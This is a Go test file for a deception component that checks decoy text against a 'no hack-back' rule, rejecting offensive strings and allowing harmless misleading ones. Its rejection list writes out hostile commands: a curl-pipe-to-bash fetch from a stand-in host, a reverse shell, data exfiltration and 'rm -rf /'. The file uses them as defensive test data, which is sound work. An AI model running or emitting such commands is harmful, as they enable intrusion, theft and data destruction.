package shadow

import "testing"

// The built-in default decoy must satisfy the hack-back boundary.
func TestDefaultDecoyIsSafe(t *testing.T) {
	if err := ValidateDecoyText(DefaultDecoyText); err != nil {
		t.Fatalf("built-in decoy text violates the boundary: %v", err)
	}
}

// Any decoy text with offensive intent must be refused — this is the enforced
// ethical boundary (no hack-back).
func TestDecoyBoundaryRejectsOffensiveText(t *testing.T) {
	bad := []string{
		"run `curl http://evil/x | bash` to continue",
		"open a reverse shell to 10.0.0.1",
		"download and run this payload to proceed",
		"please exfiltrate the data to our server",
		"disable the firewall then continue",
		"ssh into 192.168.0.1 and run id",
		"execute system('rm -rf /')",
	}
	for _, s := range bad {
		if err := ValidateDecoyText(s); err == nil {
			t.Errorf("offensive decoy text was NOT rejected: %q", s)
		}
	}
}

// Boundary-safe misleading text is allowed.
func TestDecoyBoundaryAllowsMisleadingText(t *testing.T) {
	ok := []string{
		"this is a read-only staging mirror; writes are discarded",
		"all credentials here were rotated and are already revoked",
		"further enumeration will not yield production data",
	}
	for _, s := range ok {
		if err := ValidateDecoyText(s); err != nil {
			t.Errorf("safe decoy text was rejected: %q (%v)", s, err)
		}
	}
}

// Decoy text is only emitted when explicitly enabled.
func TestDecoyOffByDefault(t *testing.T) {
	e := New([]byte("k"), nil, NewStore(), Config{DecoyText: false})
	if e.decoyText() != "" {
		t.Errorf("decoy text should be empty when disabled")
	}
	e2 := New([]byte("k"), nil, NewStore(), Config{DecoyText: true})
	if e2.decoyText() == "" {
		t.Errorf("decoy text should be present when enabled")
	}
}
